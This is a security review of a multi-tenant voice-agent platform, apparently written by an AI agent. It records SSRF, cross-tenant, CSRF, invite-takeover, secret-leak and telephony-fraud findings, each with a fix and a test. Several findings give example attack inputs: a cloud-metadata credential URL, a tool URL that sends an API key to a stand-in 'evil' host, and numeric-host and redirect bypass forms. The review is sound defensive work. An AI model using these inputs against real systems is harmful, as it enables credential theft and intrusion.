# LKAP v2: security and production review (V2-21)

**Status:** review done and fixes applied on 2026-09-23 by V2-21 (Opus). **Signed off with conditions by Fable on 2026-09-24** (§8; rulings R-V2-26 … R-V2-36 in PLAN-V2 §8; the follow-up package is V2-22, PLAN-V2 §4).
**Baseline:** HEAD `db8326e`, plus the uncommitted work of V2-21 and of the parallel V2-20F package. Nothing is committed.

**Scope.** The V2-21 card (PLAN-V2 §4), including its telephony review (rulings R-V2-23 and R-V2-25). Also asks S1, S2, V2-19T-4 and V2-19T-5, and the V2-20 findings that touch security.

**What was read.**
- **All read in full:** the auth stack (`auth/*`, `deps.py`, `settings.py`), every router, `telephony/{policy,calls}.py`, `connections/{clients,probe,service,bundle}.py`, `webhooks/delivery.py`, `routers/hooks.py`, `qa/resolve.py`, the worker's `tools/{_http_safety,declarative,builtin/http_request}.py` and `telephony.py::_on_data`, both supervisor backends, the web console proxy and `lib/auth.ts`, the CI workflows, and `scripts/smoke_v2.sh`.
- **Checked by two read-only sub-audits, then re-verified here:**
  - tenancy across all 22 routers;
  - webhook replay, signed URLs, secrets in logs and argv, supply chain.

**Severity scale:**
- **CRITICAL:** remote compromise or a cross-tenant breach with no preconditions.
- **HIGH:** cross-tenant data, secret exfiltration, or SSRF to cloud metadata by a non-operator role.
- **MEDIUM:** needs an admin, or needs specific conditions.
- **LOW:** hygiene.

## 1. Summary

| Severity | Found | Fixed, with tests | Open |
|---|---|---|---|
| CRITICAL | 0 | 0 | 0 |
| HIGH | 7 | 7 | **0** |
| MEDIUM | 16 | 8 (plus R2-22 accepted by design) | 7: R2-16…R2-19 are Fable rulings, R2-20 is V2-20F's, R2-15 has a proposed fix, R2-21 needs the GitHub remote |
| LOW | 14 | 1 | 13 (documented; R2-37 is Fable ruling F-5) |

**No HIGH is open.** The dependency advisories rated CRITICAL (Next.js) are counted under R2-07 as HIGH, because the RCE preconditions don't apply here (Windows hosting, the AV image path). They're fixed either way.

**Architect's pass (2026-09-24, §8)** added three findings, all owned by **V2-22**: R2-38 (MEDIUM, an aiohttp redirect to an IP literal bypasses the guarded resolver), R2-39 (LOW, non-canonical numeric hosts pass the offline check) and R2-40 (LOW, the web proxy's CSRF guard keys only on `Sec-Fetch-Site`). The counts above are V2-21's; with these, and R2-37 closed by R-V2-31, the MEDIUM row reads 17 found, 8 open, and the LOW row 16 found, 14 open. The `max_redirects=0` note under R2-38 is verified against aiohttp 3.14.3 (`if max_redirects and redirects >= max_redirects`).

## 2. HIGH findings (all fixed)

| ID | Sev | Finding | Evidence | Fix | Tests |
|---|---|---|---|---|---|
| R2-01 | HIGH | **Tool dry run is a full-read SSRF.** A builder (or an `agents:write` API key) writes an HTTP tool with `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` and `allowed_hosts=["169.254.169.254"]`, then calls `POST /v1/tools/{id}/dry-run`. The api fetches the URL and returns up to 8,000 characters of the body. `host_allowed` is only an allowlist, with no private-range check. | `routers/tools.py::dry_run_tool` (before the fix); `config_service.host_allowed` | New module `lkap_api/net_guard.py`. The dry run calls `validate_url` first, which returns 422 `blocked_destination` for any private, loopback, link-local, CGNAT, reserved or metadata address, allowlisted or not. `deps.get_http_client` is now a `GuardedTransport`: it resolves the name, rejects it if any answer is private, then connects to the checked IP, so DNS rebinding doesn't get through. Redirects are never followed. | `api/tests/test_security_v2_21.py::test_tool_dry_run_never_reaches_metadata_even_when_allowlisted`, `test_guarded_transport_pins_the_checked_address_and_blocks_rebinding`, `test_default_outbound_client_is_guarded`, `test_check_url_refuses_private_and_metadata_destinations_in_prod[*]` |
| R2-02 | HIGH | **Worker HTTP tools reach metadata through DNS.** `_http_safety.check_url_allowed` blocks private IP *literals* only; the old docstring said "DNS rebinding is out of scope". An allowlisted name that resolves inward (`169.254.169.254.nip.io`), or that rebinds after the check, reaches metadata from the worker host. The response goes to the model and into the transcript. | `agent/src/lkap_agent/tools/_http_safety.py` (before the fix) | `GuardedNetworkBackend` / `GuardedTransport` in `_http_safety.py`: resolve, refuse the whole name if any address is private, and connect to the checked address. TLS still verifies against the hostname. Both `declarative.py` and `builtin/http_request.py` build their client with `transport=guarded_transport()`. An explicit transport also switches off `HTTP(S)_PROXY`. | `agent/tests/unit/test_http_safety.py::test_guarded_backend_refuses_names_that_resolve_inward[*]`, `…connects_to_the_checked_address_not_the_name`, `…turns_a_rebound_name_into_a_tool_error`, `test_tool_clients_are_built_with_the_guarded_transport` |
| R2-03 | HIGH | **A builder can exfiltrate admin-held keys.** The role model says only admins manage credentials, but a builder could send one anywhere, in three ways. (a) Bind any workspace credential, including a provider key, to an HTTP tool with `url=https://evil/?k={{ secret.api_key }}`, then dry-run it or let the worker call it. (b) Set `base_url` (or `*_url`, `*endpoint`, `*host`) on a provider reference in the agent config; the worker then sends the bound key, or its own env key, to that host. (c) Set `qa.model.fields.base_url`; the api's QA judge sends the key there. | `routers/tools.py::_check_payload`; `routers/agents.py` create/update/restore; `qa/resolve.py:82` | (a) Binding a credential to a tool now needs `admin` plus `providers:write` (the `/v1/credentials` write rule), and only `http-tool-secret` credentials can be bound; a provider key gets 422. (b) `check_endpoint_overrides` on agent create, update and restore returns 403 when a caller below admin *adds or changes* an endpoint override. Keeping or removing one is still allowed, and registry defaults don't count. (c) The judge `base_url` goes through `net_guard.check_url`, and the jobs client is guarded (R2-01). | `test_builder_cannot_bind_a_credential_to_a_tool`, `test_builder_cannot_repoint_an_admin_tool_that_carries_a_secret`, `test_a_tool_may_not_use_a_provider_key`, `test_api_key_needs_providers_write_to_bind_a_tool_secret`, `test_builder_put_that_points_the_llm_at_a_new_host_is_403`, `test_builder_may_keep_or_drop_but_not_add_an_endpoint_override`, `test_endpoint_overrides_ignore_registry_defaults_and_find_nested_refs`, `test_qa_judge_base_url_on_a_private_address_is_refused` |
| R2-04 | HIGH | **Cross-tenant read of agent config history.** Agent ids are 32-hex strings and are public (`AgentPublicOut.id`, every connect response). `slugify` kept a 32-hex name as it was, so an admin in workspace B could create an agent named after A's id, giving it slug = A's id. `load_scoped_agent` matched id *or* slug, which resolved to B's own agent. But `list_versions` / `get_version` / `restore_version` then queried `AgentConfigVersion.agent_id == <raw path value>`, which is A's id. The result was A's full config history (instructions, credential ids, tools, flow), and `restore` could copy it into B. The table has no `workspace_id`, so `tenant_guard` couldn't catch it. As a side effect, the public `load_agent` raised `MultipleResultsFound` (500) on A's `/connect`, `/text-sessions` and `/embed-policy`: a cross-tenant DoS. | `routers/agents.py:630-704`, `:211-217` (before the fix) | The version queries use `row.id`. `slugify` prefixes an id-shaped slug with `agent-`. `load_agent` and `load_scoped_agent` rank an exact id match first and use `LIMIT 1` (`by_id_first`). | `test_an_agent_named_after_a_foreign_id_cannot_read_its_versions`, `test_an_id_shaped_name_never_becomes_an_id_shaped_slug`, `test_public_lookup_prefers_the_id_over_a_colliding_legacy_slug` |
| R2-05 | HIGH | **An admin of another workspace can claim a pending account.** Workspace A invites `carol` and creates a pending account with no password. The admin of workspace B then invites the same email. `create_invite` accepted the existing pending user and handed B's admin a token that *sets carol's password*, so B owns the account A is waiting on. | `routers/workspaces.py::create_invite`, `routers/auth.py::accept_invite` | `create_invite` returns 409 `pending_elsewhere` for a password-less user that another workspace has already invited (`auth/invites.py::invited_elsewhere`, read from the `member.invite` audit rows; no migration). The residual email-binding risk is R2-19 (Fable). | `test_a_pending_account_invited_by_one_workspace_cannot_be_claimed_by_another` |
| R2-06 | HIGH | **Secrets in logs.** httpx logs every request URL at INFO (`HTTP Request: GET …`), and the api and worker root loggers run at INFO. A tool URL carrying a substituted `{{ secret.NAME }}`, a dry-run URL, or a webhook URL with a token therefore went to the log pipeline in plaintext. | `httpx/_client.py` (INFO line); `api/logging.py`, `agent/logging.py` (before the fix); the supervisor already silenced httpx | `quiet_http_client_loggers()` sets `httpx`, `httpcore` and `hpack` to WARNING in both processes. It runs from `configure_logging`, which every worker job process calls in `prewarm`. | `test_http_client_loggers_never_print_request_urls` |
| R2-07 | HIGH | **Vulnerable dependencies.** Advisory totals: web: 2 critical, 8 high, 9 moderate (`next 15.5.18`, `postcss 8.4.31` and `sharp 0.34.5` through `next`, and `pdfjs-dist 5.7.284`); api: `cryptography 45.0.7`, 13 advisories; agent: `pillow 11.3.0`, 35 advisories. | §4 | Bumped: `next`/`eslint-config-next` → 15.5.26, `pdfjs-dist` → ^6.3.289, pnpm overrides `postcss ^8.5.23` and `sharp ^0.35.4`. `pdf-page.tsx` now destroys the loading task, because pdf.js 6 dropped `PDFDocumentProxy.destroy`. `cryptography>=46.0.7,<51` locks to 50.0.1; `pillow>=12.3,<13` locks to 12.3.0. | Re-audit: 0 in Python; web has 2 moderate left (dev-only vitest). All gates are green on the bumped trees (§5). A scratch `next build` passed, with `/s/[slug]` First Load at 593 kB against the 620 kB budget (`check-bundle` ok). |

## 3. MEDIUM and LOW punch list

| ID | Sev | Finding | Evidence | Status | Test / note |
|---|---|---|---|---|---|
| R2-08 | MEDIUM | **S1: connection-URL SSRF.** `POST /v1/connections`, `PUT`, `/test` and `/{id}/test` reached any `ws(s)`/`http(s)` host. Probe errors relay the remote server's message and latency, so an admin could scan the internal network, and the api sends a JWT signed with the connection's secret. | `connections/service.py::validate_url`, `connections/clients.py::api` | **Fixed.** `validate_url` refuses private and metadata hosts with a 422. `ConnectionClientFactory.api` checks IP literals and uses `GuardedResolver`, an aiohttp resolver that refuses inward answers; aiohttp connects to exactly the addresses the resolver returns. This covers every LiveKit call the api makes (probe, SIP, egress, room, DTMF), including stored rows. **Dev allowlist:** `LKAP_NET_ALLOW_PRIVATE_HOSTS` (host names, IPs, CIDRs) defaults to `localhost,127.0.0.1,::1` in `LKAP_ENV=dev` and to nothing in prod, so stage L14's `ws://localhost:7880` works. Metadata addresses are refused even when a CIDR covers them. | `test_connection_create_and_unsaved_test_refuse_private_urls[*]`, `test_connection_to_localhost_is_allowed_in_dev_for_a_self_hosted_server`, `test_connection_update_to_a_private_url_is_422`, `test_probe_of_a_stored_private_url_sends_nothing`, `test_probe_of_a_name_that_resolves_inward_is_blocked_at_connect_time` (the full runtime path: factory → guarded aiohttp session → resolver → probe message), `test_guarded_resolver_refuses_inward_answers_for_the_livekit_client`, `test_policy_from_settings[*]`, `test_metadata_address_is_refused_even_when_its_network_is_allowlisted` |
| R2-09 | MEDIUM | **Webhook endpoint SSRF (blind).** Webhook URLs were checked for scheme only, and `last_error` and the status code are echoed back. | `routers/webhooks.py::_check_url`, `webhooks/delivery.py:130` | **Fixed** without touching `webhooks/**`. `_check_url` adds `net_guard.validate_url`. The jobs service's default client is a `GuardedTransport` (`jobs/service.py`), so every delivery is re-checked after DNS. `POST …/test` uses the guarded `HttpClientDep`. | `test_webhook_endpoint_to_a_private_address_is_422[*]` |
| R2-10 | MEDIUM | **CSRF on cookie-authenticated writes.** `SameSite=Lax` doesn't stop a same-site sibling (another subdomain or port). In dev, the web proxy attached `X-Admin-Token` to *any* request, so a cross-site form or no-cors POST to `http://localhost:3000/api/console/*` got admin rights with no cookie at all. | `auth/deps.py::_principal_from_session`; `web/src/app/api/console/[...path]/route.ts` | **Fixed.** The api ignores the session cookie on a write whose `Sec-Fetch-Site` is `cross-site` or whose `Origin` (when sent) isn't one of `settings.web_origins`; it falls through to 401. A same-site sibling fails the Origin test, while the platform's own web origin calling the api same-site (:3000 → :8080) still works. Requests with no Origin (server-side, curl) are unaffected. No browser code calls the api directly with cookies: public connect uses `fetch`'s default `same-origin` credentials, and test mode goes through the proxy. The proxy refuses cross-site **and** same-site writes with 403 before adding any header, because in dev any other local port could otherwise use the break-glass token. It also refuses `.`/`..` segments and encodes each path segment, so a request can't climb out of `/v1/`. | `test_cookie_writes_from_another_origin_are_not_authenticated[*]` (5 cases), `test_a_same_site_write_from_the_platforms_own_origin_is_authenticated`; `web/tests/console-proxy-auth.test.ts` "console proxy CSRF and path guards" (5 cases) |
| R2-11 | MEDIUM | **A removed member can reuse their invite.** The invite fingerprint was `(password_hash, is_member)`, so removing an existing user put the state back and the 7-day token worked again. | `auth/invites.py::state_fingerprint` | **Fixed.** The fingerprint adds the count of `member.join` audit rows when non-zero. Accepting bumps it, so the token dies for good, and tokens issued before this change still verify. | `test_an_invite_is_dead_after_its_member_is_removed` |
| R2-12 | MEDIUM | **Inbound LiveKit webhook replay.** The signature and JWT `exp` are checked, but nothing de-duplicates on `event.id`. A captured delivery replayed before expiry appended duplicate `session_events`, re-ran egress finalisation, and could duplicate SIP call rows. | `routers/hooks.py`, `connections/webhooks.py:159` | **Fixed** (per process). `SeenEvents` on `app.state` remembers `(connection_id, event.id)` for 10 minutes, and only after the handlers ran, so LiveKit's retry of a failed delivery is still processed. With several api replicas a replay can land once per replica; the handlers' own idempotency covers that. | `test_connections_webhooks.py::test_a_replayed_event_id_is_acknowledged_but_not_handled_twice` |
| R2-13 | MEDIUM | **S2: secrets on command lines.** `python -m lkap_api.keys rotate --old <k> --new <k>` put both master keys in `ps` and in shell history (RUNBOOK told operators to run it). `scripts/smoke_v2.sh` passed the admin token (`-H`), the login password and the LiveKit secret (`--data`) as curl arguments. The dev `launch.json` runs `bash -c "export LIVEKIT_API_SECRET=… LKAP_MASTER_KEY=… && exec …"`; checked by key names and fingerprints only. | `keys.py`, `smoke_v2.sh`, launch.json (`lkap-api`, `lkap-web`, `lkap-agent` entries) | **Fixed** for the repo: `rotate` reads `LKAP_OLD_MASTER_KEY` and `LKAP_NEW_MASTER_KEY`; the flags still work but log a warning. RUNBOOK updated. The smoke script sends bodies on stdin (`--data-binary @-`) and the token from a 0600 header file. **Prod never uses argv:** the supervisor's subprocess backend runs `python -m lkap_agent.main start` with secrets only in `env=`, and the docker backend uses the container `environment`. **launch.json: proposal only**, see §7. | `test_rotate_reads_keys_from_the_environment`, `test_rotate_without_keys_names_the_variables`, `test_vault.py::test_keys_cli_rotate_without_keys_names_the_environment_variables`; `supervisor/tests/test_subprocess_backend.py::test_child_gets_the_worker_env_and_only_allowlisted_parent_env` (asserts argv `== ["start"]`); `test_docker_backend.py` (env only, secret not in labels or state) |
| R2-14 | MEDIUM | **Generated owner password logged in prod.** `bootstrap` logged the generated owner password at WARNING, and JSON logs are shipped and retained. | `bootstrap.py:268` | **Fixed.** In prod the password goes to `<LKAP_DATA_DIR>/owner-password.txt` (0600) and only the path is logged. Dev keeps the one-time log line (RUNBOOK). | `test_prod_writes_a_generated_owner_password_to_a_private_file_not_the_log` |
| R2-15 | MEDIUM | **Concurrency caps can be exceeded (race).** `connect` counts live sessions, then inserts, with nothing held in between. Load test: a burst of 50 simultaneous connects to an agent capped at `max_concurrent_sessions=5` admitted **14**. The same check-then-insert pattern is in `prepare_outbound_call` (`max_concurrent_outbound`) and in `routers/text_sessions.py`. The per-agent and per-workspace minute buckets still bound the damage. | `routers/connect.py`, `routers/text_sessions.py`, `limits.py::live_session_count`, `telephony/calls.py::prepare_outbound_call`; `scratchpad/loadtest/race.py` | **Open, ruling R-V2-34, owner V2-22.** `limits.reserve_session_slot`: a per-process lock keyed by agent (or workspace) held through the route's commit, plus `FOR UPDATE` on Postgres; RUNBOOK: one api process on SQLite. | V2-22: exact-5 burst test; Postgres CI case |
| R2-16 | MEDIUM | **One platform-wide service token.** `/internal/v1/*` accepts a single `LKAP_SERVICE_TOKEN` for every workspace: `sessions/{id}/resolved` returns decrypted credentials for any workspace, and `connections/{id}/worker-env` returns any connection's LiveKit secret. The Cloud deploy bundle tells whoever deploys a workspace's worker to paste "the api's service token". The api never returns the token itself; bundles use a placeholder. | `deps.require_service`; `connections/bundle.py:206-218` | **Ruled R-V2-27: deferred with triggers** (a second organisation as tenant, tenant-hosted workers, the Phase 2 `cloud_hosted` deploy). Interim (V2-22): a `remote_ip` gate on `/internal/*` in `deploy/Caddyfile` and the RUNBOOK rule that the token never reaches a workspace admin. | n/a |
| R2-17 | MEDIUM | **SIP transfer to an arbitrary host.** Per R-V2-23's text, `sip:+15551230000@<any host>` passes the policy by its numeric prefix, whatever the host, so a builder-configured target (or a console transfer) can REFER a caller to an attacker's SIP server. That means call hijack or eavesdropping, not toll fraud. The model can only pick configured targets. | `telephony/policy.py::_number_and_host` | **Ruled R-V2-28, owner V2-22:** a numeric-user `sip:` target needs the prefix **and** a listed host. | `test_telephony.py::test_console_transfer_policy_sip_host_and_numeric_user` inverts; new cases in `test_telephony_policy.py` |
| R2-18 | MEDIUM | **Two gaps in the `+1` premium ranges.** (a) `allowed_prefixes=["+1"]` also admits about 20 Caribbean NANP countries (`+1 809/829/849` Dominican Republic, `+1 876` Jamaica, `+1 284`, `+1 473`, `+1 649` …), the classic "one-ring" IRSF destinations. (b) `BLOCKED_PREFIXES` has `+1976`, but NANP 976 pay-per-call numbers are an *exchange* (`+1 NPA 976 xxxx`, e.g. `+1 212 976 …`), which a prefix list can't express, so they pass. | `telephony/policy.py::BLOCKED_PREFIXES` | **Ruled R-V2-29, owner V2-22:** `+1` admits US and Canada only (`NANP_NON_US_CA_NPAS` from the NANPA table; an explicit longer prefix overrides); `NPA-976-xxxx` always blocked; console warning when `+1` alone is listed. | V2-22 cases in `test_telephony_policy.py` |
| R2-19 | MEDIUM | **`add_member` trusts an unverified email.** Accounts are global, and nothing proves an email's owner. An admin of A can pre-create `alice@b-corp` (invite and accept with a chosen password); if B later uses `add_member` for that email, A's admin holds a B membership. Residual of R2-05. | `routers/workspaces.py::add_member` | **Ruled R-V2-30, owner V2-22:** `add_member` only re-adds a former member of this workspace; any other existing account → 409 `use_invite` (the invite path already requires the account's own password). Email verification is a multi-tenant condition (§8). | V2-22 case |
| R2-20 | MEDIUM | **`recording.ready` can fire twice with different event ids.** Both the `egress_ended` webhook and the worker's `/recording` fallback schedule the finalise job unconditionally. | `recordings/finalize.py:106`, `routers/internal.py:521`, `recordings/job.py:46-63` | **Open, owner V2-22** (R-V2-36; V2-20F declined it as out of scope, `_asks.md` #77). Derive the outbound `event_id` from `(session_id, "recording.ready")` or schedule only on the transition to `ready`. | V2-22: one delivery per session |
| R2-21 | MEDIUM | **Supply-chain pins are tags, not digests.** GitHub Actions are pinned by major tag (`actions/checkout@v4` …), base images by tag (`python:3.12-bookworm-slim`, `node:24-alpine`, `ghcr.io/astral-sh/uv:0.12.15`, compose `postgres:16` …). The agent image installs flavour requirements (`requirements/{slim,full}.txt`) outside `uv.lock` with no hashes. Lockfiles themselves are used frozen everywhere (`uv sync --frozen`, `pnpm install --frozen-lockfile`). | `.github/workflows/*`, `*/Dockerfile`, `agent/Dockerfile:103-111` | **Open (documented).** Pin actions by SHA (Dependabot keeps them current), pin images `@sha256:`, and compile flavour requirements with `--generate-hashes` then install with `--require-hashes`. This needs the GitHub remote the user hasn't created yet. | n/a |
| R2-22 | MEDIUM | **Proxy environment and the guard.** When an explicit transport is set, httpx's environment proxies are off, so every guarded client goes direct. An operator who needs an egress proxy must enforce the private-range rule there. Also, `GuardedTransport` replaces httpx's private `_pool`, so an httpx upgrade could silently drop the guard. | `net_guard.GuardedTransport`, `agent/…/_http_safety.GuardedTransport` | **Accepted (documented)**, a deliberate choice. A tripwire test fails if the pool stops using the guarded backend. | `test_guarded_transport_really_installs_the_guarded_backend` |
| R2-23 | MEDIUM | **V2-19T-5a: refused dials left no audit row.** A refused `POST /v1/calls` or console transfer (422/429) wrote no `audit_log` row, because the request transaction rolls back. | `routers/calls.py` | **Fixed.** `_audit_refusal` rolls the request session back first, which avoids the non-WAL SQLite lock, then writes `call.refused` / `call.transfer_refused` with `{code, status, to, agent_id}` in a second session. It's best effort: a failed audit write never masks the refusal. | `test_telephony_policy.py::test_builder_dialing_off_list_is_422_audited_and_never_dialed`, `…eleventh_call_in_a_minute_is_429_and_audited`, `…calls_busy_is_audited_as_a_refusal`, `…policy_less_workspace…`, `…sip_uri_user_on_an_unlisted_host…` |
| R2-24 | LOW | **`live.yml` script injection.** `${{ inputs.pytest_args }}` was interpolated into `run:` next to every secret, and no workflow declared `permissions:`. | `.github/workflows/live.yml:60` | **Fixed.** The input goes through `env: PYTEST_ARGS`, and all five workflows have `permissions: contents: read`. | YAML parses (checked) |
| R2-25 | LOW | **Local-storage signed URLs are loosely scoped.** They're HMAC'd with `LKAP_MASTER_KEY` itself and cover only `key:exp`, not the workspace or storage config. No route serves them today. | `storage/local.py:35`, `storage/resolve.py:34,51` | **Open.** Before a route is added: an HKDF-derived key, sign workspace and config id, authenticate the route. S3 presigned GETs (1 h, server-built key, behind a workspace-scoped admin route) are fine. | n/a |
| R2-26 | LOW | **KB uploads put the client filename into the object key.** `LocalStorage._path` blocks escape and S3 treats `..` literally. | `routers/knowledge.py:316,327` | **Open.** Sanitise to the basename. | n/a |
| R2-27 | LOW | **Invite token in a query string** (`/login?invite=<token>`), so it lands in proxy access logs. | `routers/workspaces.py:284` | **Open.** Move it to a fragment. | n/a |
| R2-28 | LOW | **Phone numbers are globally unique with no proof of ownership.** Workspace A can squat B's E.164 number, and the 409 reveals which numbers are registered. | `telephony/service.py:668` | **Open.** | n/a |
| R2-29 | LOW | **Email enumeration through `add_member`** (404 vs 201). | `routers/workspaces.py:230` | **Open.** | n/a |
| R2-30 | LOW | **API keys can outlive their scope and creator.** A `*` API key can mint a non-expiring `*` key, and keys outlive the user who created them. | `routers/api_keys.py` | **Open.** | n/a |
| R2-31 | LOW | **Public enumeration.** `/v1/health` exposes `livekit_url` and counts. Anonymous callers get 403 for an unpublished slug and 404 for an unknown one, so slugs can be enumerated. | `routers/health.py`, `routers/connect.py` | **Open.** | n/a |
| R2-32 | LOW | **Egress webhook handlers don't filter `connection_id`.** They still filter on the workspace, so impact stays within one workspace. | `connections/webhooks.py:198`, `recordings/finalize.py:93` | **Open** (`finalize.py` is V2-20F's). | n/a |
| R2-33 | LOW | **Upstream transport error text reaches responses.** `str(exc)` (host and port) goes into 502 bodies (`telephony/common.py:72`) and into webhook `last_error`. | as cited | **Open.** Host and port only; no secrets seen. | n/a |
| R2-34 | LOW | **S3 `endpoint_url` isn't guarded.** An admin-set `storage_configs.endpoint_url` reaches botocore without the net guard (signed-URL generation needs no request; Egress uploads run on LiveKit's side). The KB embedder isn't affected: `resolve_embedder` builds `OpenAIEmbedder` with only the credential's `api_key`, so its base URL stays the fixed OpenAI one. | `storage/s3.py`, `kb/embed.py:235` | **Open.** Add `net_guard.validate_url` at storage-config save. | n/a |
| R2-35 | LOW | **vitest moderate advisories** (`GHSA-82fw-gwwq-j7x9`); dev-only. | `pnpm audit` | **Open.** It needs vitest 4 (a major); not bumped. | n/a |
| R2-36 | LOW | **Other secrets on command lines.** The prod compose `mc alias set … "$$MINIO_ROOT_PASSWORD"` puts the MinIO password in argv. | `deploy/docker-compose.prod.yml:269` | **Open.** Use the `MC_HOST_local` env variable. | n/a |
| R2-37 | LOW | **Stuck-dial constant, V2-19T-4.** `STUCK_DIAL_AFTER_S` is 195 s, from the formula; the ruling text says 210. | `telephony/calls.py:110` | **Closed by R-V2-31:** 195 s is right (120 + 15 + 60); the R-V2-24 text is corrected. No code change. | n/a |
| R2-38 | MEDIUM | **aiohttp follows a redirect to an IP literal around the guard** (found at sign-off). aiohttp's `TCPConnector._resolve_host` returns IP-literal hosts without consulting the resolver, so `GuardedResolver` never sees them, and the LiveKit `TwirpClient` posts with the default `allow_redirects=True`. Reproduced on the tree: a `307` from a host standing in for an admin-controlled public server sent the Twirp POST to `http://127.0.0.1:<port>/latest/meta-data/`, which answered 200 with its body; the resolver was never called. From the api's network position this relays a POST body (307/308) to any internal address, metadata included, and feeds the response to the Twirp parser and the probe message. The `Authorization` header did not follow the redirect (aiohttp drops it on a host change), so the connection's JWT does not leak. Needs an admin to set a connection URL. Partially reopens R2-08 until fixed. | `net_guard.guarded_aiohttp_session`, `connections/clients.py::api`; aiohttp 3.14.3 `connector.py::_resolve_host`; `livekit.api.twirp_client` (1.2.1) | **Open, ruling R-V2-26, owner V2-22.** (a) A `TCPConnector` subclass whose `_resolve_host` runs IP literals through `address_problem`; (b) a `ClientSession` subclass forcing `allow_redirects=False` (not `max_redirects=0`, which aiohttp treats as unlimited). | V2-22: `test_hardening_v2_22.py` (redirecting fake → literal → target never hit; literal refused by the connector) |
| R2-39 | LOW | **Non-canonical numeric hosts pass the offline check** (found at sign-off). `check_url` (api) and `check_url_allowed` (worker) treat `2130706433`, `0x7f000001`, `127.1` and `0` as names, so a webhook or connection URL in that form saves with 201. The connect-time guard catches them on both sides (`getaddrinfo` returns `127.0.0.1` / `0.0.0.0`, which the resolved-address check refuses; verified), so this is defence in depth. `0177.0.0.1` is rejected by httpx outright. | `net_guard.host_problem`, `_http_safety.is_private_host` | **Open, ruling R-V2-26, owner V2-22.** Refuse any host whose last label is all digits or that starts with `0x`. | V2-22: parametrised save-time 422 on both surfaces; `test_http_safety.py` |
| R2-40 | LOW | **The web proxy's CSRF guard keys only on `Sec-Fetch-Site`.** A browser that doesn't send it (Safari before 16.4) with the dev break-glass token on can be made to POST to `/api/console/*` cross-site. Dev only: in production the bypass is off and the api's own `Origin` check guards cookie writes. | `web/src/app/api/console/[...path]/route.ts::crossSiteWrite` | **Open, ruling R-V2-36, owner V2-22.** Also refuse a write whose `Origin` is present and is not the request's own origin. | V2-22: `console-proxy-auth.test.ts` |

### Verified sound (no finding)
- **DTMF origin check:** `telephony.py::_on_data` drops any packet with `participant is not None`, and validates `op` and the digits. V2-20 confirmed live that `RoomService.SendData` arrives with `participant is None`, so no HMAC fallback is needed.
- **Trunk password:** `TrunkOut` has only `has_password`, and the trunk service logs ids only. `test_telephony_policy.py::test_trunk_password_never_reaches_a_response_or_a_log_line` checks create, list, get, update and every log record.
- **Internal telephony routes:** both return 401 without a service token, with a wrong one, and with only the admin token (`test_internal_telephony_routes_need_the_service_token`, 6 cases).
- **Cookies:** `HttpOnly`, `SameSite=Lax`, and `Secure` outside dev. Every login issues a new row, so no session fixation. A password change revokes the user's other sessions.
- **Passwords:** argon2id at argon2-cffi's RFC 9106 low-memory profile, with rehash on login. An unknown email costs the same as a wrong password. Rate limited per IP and per email.
- **Break-glass token:** off in prod unless `LKAP_ALLOW_ADMIN_TOKEN` is set. In prod the api refuses weak or `dev-*` service, session and admin secrets (<32 chars). The web bypass is off under `NODE_ENV=production`.
- **API keys:** scopes are enforced (`calls:write` is needed to dial). A bad or revoked key returns 401, and after V2-20's B1 fix that happens immediately.
- **Outbound webhook signing:** HMAC over `t.body`, `compare_digest`, a fresh `t` on each retry, and the secret encrypted at rest.
- **Tenancy:** every other router scopes by `ctx.workspace_id`, including foreign ids in request bodies (connection, credential, tool, KB, storage config, trunk, agent). The calls routes now have a two-workspace test (`test_another_workspace_cannot_see_steer_or_dial_through_these_calls`).
- **Call bucket (V2-19T-5b):** enforced even when `LKAP_RATE_LIMIT_ENABLED=false` (`test_the_call_bucket_holds_even_with_the_rate_limiter_switched_off`). I agree with keeping it as a toll-fraud control.
- **Images:** all run as non-root `lkap`. There's no `curl | sh` anywhere.

## 4. Dependency audit

`uvx pip-audit` (v2) ran against each package's frozen `uv export` (all extras and groups, local path deps excluded, `--no-deps --disable-pip`). `pnpm audit` ran in `web/`.

| Package | Before | After |
|---|---|---|
| contracts | 0 | 0 |
| api | `cryptography 45.0.7`: 13 advisories (PYSEC-2026-35/36/2141/3552/3553/3554, GHSA-537c-gmf6-5ccf; fixes up to 50.0.0) | `cryptography 50.0.1`: **0** |
| agent | `pillow 11.3.0`: 35 advisories (fixes 12.1.1 to 12.3.0) | `pillow 12.3.0`: **0** |
| packs, supervisor, testing | 0 | 0 |
| web | 19: **2 critical** (next RCE: Windows hosting; Image Optimization with AV), **8 high** (next SSRF ×2, next DoS, postcss ×2, sharp ×2, pdfjs-dist arbitrary JS on a malicious PDF), 9 moderate | **2 moderate** (vitest and `@vitest/mocker`, dev-only; needs vitest 4) |

**Web changes:**
- `next` and `eslint-config-next` 15.5.26.
- `pdfjs-dist ^6.3.289`, with `pdf-page.tsx` adapted.
- `pnpm.overrides`: `postcss@<8.5.23 → ^8.5.23`, `sharp@<0.35.4 → ^0.35.4`.

The lockfile was regenerated in a scratch copy (`scratchpad/web-bump`); only these entries changed among the direct dependencies. `web/package.json`, `web/pnpm-lock.yaml` and `pdf-page.tsx` were copied back. **`web/node_modules` was not touched**, because the user's `next dev` on :3000 runs from it. After review the user runs `pnpm install` in `web/` and restarts `lkap-web`.

**Python changes:**
- `api/pyproject.toml`: `cryptography>=46.0.7,<51`.
- `agent/pyproject.toml`: `pillow>=12.3,<13`.
- `uv lock --upgrade-package` changed only those packages.

The gates ran on scratch venvs synced from the new locks (`UV_PROJECT_ENVIRONMENT`), so the running api's and worker's `.venv` weren't swapped under them. Their next `uv run` or `uv sync` picks up the new versions. The `lkap-agent` worker needs a restart to load pillow 12.

## 5. Load test of `connect`, and gates

**Setup.**
- A scratch api on **:8121** with a fresh scratch DB. Cwd was the scratchpad, so no `.env` was read.
- Fake LiveKit credentials and a `*.livekit.cloud`-shaped URL; `connect` mints its JWT locally and never calls LiveKit, so no room was created.
- One uvicorn worker and SQLite, which is the default deployment.
- k6 isn't installed, so `scratchpad/loadtest/load_connect.py` did the equivalent job: asyncio plus httpx, **open loop** at a fixed rate, 30 s per phase.
- Request mix: 40% valid; 10% each of no Origin, bad Origin, unknown agent, draft agent, >2 KB metadata, and malformed JSON.

| Phase | Requests | Achieved | Overall p50 / p95 / p99 | Valid connects p50 / p95 | Status totals | 5xx / transport errors |
|---|---|---|---|---|---|---|
| A: default agent limits (6/min per IP, 60/min per agent, 5 concurrent) at 100 rps | 3000 | 100.0 rps | 2.8 / 4.9 / 7.9 ms | 2.9 / 5.6 ms | 200 ×6, **429 ×1194** (`rate_limited` ×1192, `agent_busy` ×2), 403 ×900, 404 ×300, 422 ×600 | **0** |
